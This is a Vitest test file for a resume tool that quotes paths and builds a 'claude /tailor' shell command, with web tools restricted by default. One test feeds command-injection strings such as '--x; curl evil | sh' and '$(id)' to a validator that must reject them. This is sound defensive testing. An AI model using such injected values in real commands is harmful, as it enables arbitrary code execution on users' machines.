// @vitest-environment node
import { describe, expect, it } from "vitest";

import { buildTailorCommand, shellQuote, tailorPrompt } from "@/lib/resume/command";

import { resumeConfig } from "./helpers";

const configured = resumeConfig((raw) => {
  raw.resume_kit_path = "/Users/me/dev/resume-kit";
});

describe("shellQuote", () => {
  it("leaves plain words alone and quotes the rest", () => {
    expect(shellQuote("/Users/me/dev/resume-kit")).toBe("/Users/me/dev/resume-kit");
    expect(shellQuote("/Users/me/My Files/x.md")).toBe('"/Users/me/My Files/x.md"');
    expect(shellQuote("")).toBe('""');
  });

  it("uses single quotes where double quotes would still expand", () => {
    expect(shellQuote("/a/$HOME/b c")).toBe("'/a/$HOME/b c'");
    expect(shellQuote("a `b` c")).toBe("'a `b` c'");
    expect(shellQuote("it's here")).toBe(`'it'\\''s here'`);
  });
});

describe("buildTailorCommand", () => {
  it("is cd <resume-kit> && claude \"/tailor <jd>\"", () => {
    expect(buildTailorCommand({ config: configured, jdPath: "/data/exports/jd/acme-ai-2026-10-07.md" })).toBe(
      'cd /Users/me/dev/resume-kit && claude --disallowed-tools=WebFetch,WebSearch "/tailor /data/exports/jd/acme-ai-2026-10-07.md"',
    );
  });

  it("puts claude_args after the command: restricted tools by default, nothing when it is emptied, the user's own choice otherwise", () => {
    const withArgs = (args: string | undefined) =>
      resumeConfig((raw) => {
        raw.resume_kit_path = "/k";
        if (args !== undefined) raw.claude_args = args;
      });
    expect(buildTailorCommand({ config: withArgs(undefined), jdPath: "/x.md" })).toBe('cd /k && claude --disallowed-tools=WebFetch,WebSearch "/tailor /x.md"');
    expect(buildTailorCommand({ config: withArgs(""), jdPath: "/x.md" })).toBe('cd /k && claude "/tailor /x.md"');
    expect(buildTailorCommand({ config: withArgs("--disallowed-tools=Bash,WebFetch,WebSearch"), jdPath: "/x.md" })).toBe(
      'cd /k && claude --disallowed-tools=Bash,WebFetch,WebSearch "/tailor /x.md"',
    );
  });

  it("claude_args cannot carry shell syntax", () => {
    for (const bad of ["--x; curl evil | sh", "$(id)", "`id`", "--a && b", "--a\nb", "'q'", '"q"', "a > f", "a\\b"]) {
      expect(() => resumeConfig((raw) => (raw.claude_args = bad)), bad).toThrow();
    }
  });

  it("is null while resume_kit_path is not configured", () => {
    expect(buildTailorCommand({ config: resumeConfig(), jdPath: "/x.md" })).toBeNull();
  });

  it("names the master resume and the PDF folder when they are configured", () => {
    const config = resumeConfig((raw) => {
      raw.resume_kit_path = "/Users/me/dev/resume-kit";
      raw.master_resume_path = "/Users/me/private/Master.yaml";
      raw.pdf_dir = "/Users/me/private/Exports";
    });
    expect(buildTailorCommand({ config, jdPath: "/x.md" })).toBe(
      'cd /Users/me/dev/resume-kit && claude --disallowed-tools=WebFetch,WebSearch "/tailor /x.md master-resume=/Users/me/private/Master.yaml exports-folder=/Users/me/private/Exports"',
    );
  });

  it("keeps a path with spaces as one argument at both levels", () => {
    const config = resumeConfig((raw) => {
      raw.resume_kit_path = "/Users/me/My Dev/resume-kit";
    });
    const command = buildTailorCommand({ config, jdPath: "/Users/me/My Data/jd/x.md" });
    expect(command).toBe(`cd "/Users/me/My Dev/resume-kit" && claude --disallowed-tools=WebFetch,WebSearch '/tailor "/Users/me/My Data/jd/x.md"'`);
    expect(tailorPrompt({ config, jdPath: "/Users/me/My Data/jd/x.md" })).toBe('/tailor "/Users/me/My Data/jd/x.md"');
  });

  it("quotes a master resume or PDF folder with spaces inside the prompt", () => {
    const config = resumeConfig((raw) => {
      raw.resume_kit_path = "/k";
      raw.master_resume_path = "/My Docs/Master.yaml";
    });
    expect(tailorPrompt({ config, jdPath: "/x.md" })).toBe('/tailor /x.md master-resume="/My Docs/Master.yaml"');
    expect(buildTailorCommand({ config, jdPath: "/x.md" })).toBe(`cd /k && claude --disallowed-tools=WebFetch,WebSearch '/tailor /x.md master-resume="/My Docs/Master.yaml"'`);
  });

  it("uses the configured claude command", () => {
    const config = resumeConfig((raw) => {
      raw.resume_kit_path = "/k";
      raw.claude_command = "claude --model opus";
    });
    expect(buildTailorCommand({ config, jdPath: "/x.md" })).toBe('cd /k && claude --model opus --disallowed-tools=WebFetch,WebSearch "/tailor /x.md"');
  });
});
